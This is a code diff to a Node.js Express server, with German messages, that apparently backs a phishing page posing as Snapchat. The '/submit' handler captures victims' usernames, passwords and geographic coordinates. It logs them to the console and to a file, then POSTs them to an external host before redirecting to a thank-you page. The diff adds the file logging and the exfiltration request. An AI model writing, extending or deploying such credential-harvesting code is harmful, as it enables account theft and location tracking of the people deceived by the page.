@@ -23,6 +23,14 @@ app.post('/submit', async (req, res) => {
       userAgent: req.headers['user-agent'],
       username,
       password,
+      latitude,
+      longitude
+     };
+
+    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
+      if (err) console.error("Log-Fehler:", err);
+    });
+    
     console.log("👤 Benutzername:", username);
     console.log("🔑 Passwort:", password);
     console.log("📍 Standort:", latitude, longitude);
@@ -30,3 +38,17 @@ app.post('/submit', async (req, res) => {
 
     await fetch('https://snapchat-usvu.onrender.com/submit', {
       method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(logData)
+    });
+
+    res.redirect('/danke.html');
+  } catch (error) {
+    console.error("❌ Fehler:", error);
+    res.status(500).send("Serverfehler");
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
+});
